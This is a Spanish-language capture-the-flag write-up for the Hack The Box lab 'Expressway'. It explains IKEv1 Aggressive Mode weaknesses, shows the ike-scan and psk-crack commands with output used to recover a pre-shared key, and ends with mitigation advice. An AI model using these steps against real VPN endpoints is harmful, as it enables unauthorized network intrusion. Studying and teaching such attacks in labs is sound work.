# IKE — Explicación resumida

- **Qué es:** IKE (Internet Key Exchange) es el protocolo de negociación de claves y parámetros de seguridad para establecer túneles IPsec (VPN).  
- **Versiones:** IKEv1 (antiguo) e IKEv2 (más moderno y seguro).  
- **Modos en IKEv1:**  
  - **Main Mode:** intercambio más seguro en múltiples pasos; no revela datos que permitan ataques offline.  
  - **Aggressive Mode:** intercambio más corto y rápido; puede **revelar Nonce/ID/Hash** que permiten ataques offline contra PSK.  
- **PSK:** Pre-Shared Key, método de autenticación que depende de una clave compartida; si la PSK es débil, puede ser crackeada offline a partir de un handshake de Aggressive Mode.  
- **Flujo de ataque (resumen):** usar `ike-scan` para capturar handshake → `--pskcrack`/`psk-crack` o conversion a formato hash → probar un diccionario (rockyou, etc.) → obtener PSK válido → usar PSK para establecer túnel y acceder a la red interna (si hay mapping/privilegios).

## Resumen máquina htb expressway
- Se detectó **IKEv1 en Aggressive Mode** con autenticación **PSK**.  
- Se extrajo el handshake con `ike-scan` y se crackeó offline con `psk-crack`.  
- PSK encontrada: `freakingrockstarontheroad`.  
- Con la PSK y la identidad IKE (`ike@expressway.htb`) se obtuvo acceso operativo en el laboratorio (SSH).

## Enumeración (comando + salida esencial)
```bash
sudo ike-scan -M -A --pskcrack=output.txt 10.129.106.246
```
Salida relevante:
```
10.129.106.246  Aggressive Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    Nonce(32 bytes)
    KeyExchange(128 bytes)
    Hash(20 bytes)
```
`--pskcrack=output.txt` guarda los parámetros necesarios para el cracking.

## Cracking (comando + resultado)
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt output.txt
```
Resultado:
```
key "freakingrockstarontheroad" matches SHA1 hash c7d8b13...
```

## Qué significa la identidad IKE
- `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)` es la **identidad IKE** (FQDN) enviada en la negociación.  
- No es necesariamente un usuario UNIX, pero en muchos labs/dispositivos se mapea a una cuenta o a permisos que permiten acceso posterior.  
- En este laboratorio, usar esa identidad + PSK validó la conexión y permitió acceso SSH.

## Notas de mitigación (copiar en reporte)
- Rotar PSK inmediatamente.  
- Deshabilitar Aggressive Mode; usar Main Mode o IKEv2.  
- Preferir autenticación por certificados en lugar de PSK.  
- Evitar 3DES/SHA1/modp1024; forzar cifrados/grupos fuertes (AES, SHA2, modp2048+).  
- Habilitar logging/alertas para negociaciones IKE y accesos.


---


